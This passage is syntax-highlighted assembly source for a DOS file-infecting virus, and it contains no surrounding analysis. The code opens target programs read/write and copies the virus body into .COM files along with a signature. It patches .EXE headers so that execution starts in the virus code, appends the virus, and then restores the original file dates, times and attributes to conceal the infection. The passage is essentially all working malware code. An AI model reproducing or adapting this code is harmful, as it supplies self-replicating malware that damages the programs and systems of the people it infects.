    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">F_PATH</span><span class="sc0">       </span><span class="sc1">; Address program pathname</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; No attributes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set file attributes</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set attributes)</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0370</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0380</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Close handle)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; No file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">        </span><span class="sc1">; Open handle read/write</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Open handle)</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0380</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; \
    MOV DS,AX           ;  ) Make DS &amp; ES same as CS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700H</span><span class="sc0">        </span><span class="sc1">; Get file date and time</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get file date)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_DATE</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save file date</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_TIME</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save file time</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ Beginning of file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Move pointer)</span><span class="sc0">
</span><span class="sc5">BP0380</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0410</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">EXE_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test EXE switch</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0390</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0430</span><span class="sc0">          </span><span class="sc1">; Process EXE file</span><span class="sc0">

    </span><span class="sc1">; .COM file processing</span><span class="sc0">

</span><span class="sc5">BP0390</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1000H</span><span class="sc0">        </span><span class="sc1">; 64K of memory wanted</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">          </span><span class="sc1">; Allocate memory</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Allocate memory)</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0400</span><span class="sc0">          </span><span class="sc1">; Branch if successful</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Close handle)</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Terminate</span><span class="sc0">

</span><span class="sc5">BP0400</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">MEM_SW</span><span class="sc0">          </span><span class="sc1">; Set on memory allocated switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Segment of allocated memory</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Start of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Start of allocated memory</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Copy virus to allocated</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Address after virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_SIZE</span><span class="sc0">       </span><span class="sc1">; Total file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; \ Set DS to ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Read handle)</span><span class="sc0">
</span><span class="sc5">BP0410</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0420</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Add previous file size</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ Beginning of file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Move pointer)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VR_SIG</span><span class="sc0">    </span><span class="sc1">; Signature</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; Length to move</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVS</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">VR_SIG</span><span class="sc0">  </span><span class="sc1">; Copy signature to end</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Start of allocated</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Write handle)</span><span class="sc0">
</span><span class="sc5">BP0420</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0440</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0510</span><span class="sc0">          </span><span class="sc1">; Free memory and reset values</span><span class="sc0">

    </span><span class="sc1">; .EXE file processing</span><span class="sc0">

</span><span class="sc5">BP0430</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">          </span><span class="sc1">; Length of EXE header</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXEHED</span><span class="sc0">    </span><span class="sc1">; .EXE header store</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Read handle)</span><span class="sc0">
</span><span class="sc5">BP0440</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0460</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD09</span><span class="sc4">,</span><span class="sc2">1988H</span><span class="sc0">        </span><span class="sc1">; Negative checksum</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD07</span><span class="sc0">       </span><span class="sc1">; \ Store initial stack segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PRG_SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD08</span><span class="sc0">       </span><span class="sc1">; \ Store initial stack pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PRG_SP</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD10</span><span class="sc0">       </span><span class="sc1">; \ Store initial code offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PRGOFF</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD11</span><span class="sc0">       </span><span class="sc1">; \ Store initial code segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PRGSEG</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD02</span><span class="sc0">       </span><span class="sc1">; Get size of file in pages</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">EXHD01</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Number of bytes in last page</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0450</span><span class="sc0">          </span><span class="sc1">; Branch if none</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; One less page</span><span class="sc0">
</span><span class="sc5">BP0450</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc5">BYTSEC</span><span class="sc0">          </span><span class="sc1">; Bytes per sector</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD01</span><span class="sc0">       </span><span class="sc1">; \ Add bytes in last page</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">          </span><span class="sc1">; \ Round up</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFF0H</span><span class="sc0">       </span><span class="sc1">; Clear bottom figure</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_SIZ1</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save low-order file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_SIZ2</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save high-order file size</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; \ Add virus length</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
</span><span class="sc5">BP0460</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0480</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc5">BYTSEC</span><span class="sc0">          </span><span class="sc1">; Bytes per sector</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Test odd bytes</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0470</span><span class="sc0">          </span><span class="sc1">; Branch if none</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; One more page for odd bytes</span><span class="sc0">
</span><span class="sc5">BP0470</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD02</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store size of file in pages</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD01</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Store bytes in last page</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">F_SIZ1</span><span class="sc0">       </span><span class="sc1">; Low-order file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">F_SIZ2</span><span class="sc0">       </span><span class="sc1">; High-order file size</span><span class="sc0">
    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc5">PARAGR</span><span class="sc0">          </span><span class="sc1">; Size of a paragraph</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">EXHD04</span><span class="sc0">       </span><span class="sc1">; Size of header in paragraphs</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD11</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Initial code segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD10</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0030</span><span class="sc0">    </span><span class="sc1">; Initial code offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD07</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Initial stack segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXHD08</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Initial stack pointer</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ Beginning of file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Move pointer)</span><span class="sc0">
</span><span class="sc5">BP0480</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0490</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">          </span><span class="sc1">; Length of EXE header</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXEHED</span><span class="sc0">    </span><span class="sc1">; .EXE header store</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Write handle)</span><span class="sc0">
</span><span class="sc5">BP0490</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0500</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Has same length been written</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0510</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">F_SIZ1</span><span class="sc0">       </span><span class="sc1">; Low-order file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_SIZ2</span><span class="sc0">       </span><span class="sc1">; High-order file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Move pointer)</span><span class="sc0">
</span><span class="sc5">BP0500</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0510</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Address beginning of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Write handle)</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0510</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">MEM_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test memory allocated switch</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0520</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">          </span><span class="sc1">; Free allocated memory</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Free memory)</span><span class="sc0">
</span><span class="sc5">BP0520</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Test file handle</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Terminate if none</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">F_DATE</span><span class="sc0">       </span><span class="sc1">; Get file date</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_TIME</span><span class="sc0">       </span><span class="sc1">; Get file time</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">        </span><span class="sc1">; Set file date and time</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set file date)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Close handle)</span><span class="sc0">
    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">F_PATH</span><span class="sc0">       </span><span class="sc1">; Address program pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_ATTS</span><span class="sc0">       </span><span class="sc1">; Load file attributes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set file attributes</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set attributes)</span><span class="sc0">
    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">INT_24</span><span class="sc0">       </span><span class="sc1">; Original interrupt 24H address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2524H</span><span class="sc0">        </span><span class="sc1">; Set interrupt 24H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set int)</span><span class="sc0">
